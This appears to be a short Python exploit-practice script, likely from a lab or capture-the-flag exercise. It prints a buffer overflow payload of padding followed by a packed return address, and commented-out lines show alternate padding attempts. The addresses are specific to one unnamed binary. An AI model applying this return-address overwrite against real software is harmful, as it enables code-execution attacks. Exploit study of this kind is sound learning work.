import struct

address = 0x55555555551a
address2 = 0xdeadbeefdeadbeef
print("a"*60 + struct.pack("<Q", address))
# print(0x61 *(0x7ffff8061110 - 0x7ffff80610f0 + 8) + struct.pack("<Q", address))
# print("a"*64 + "bbbbbbb")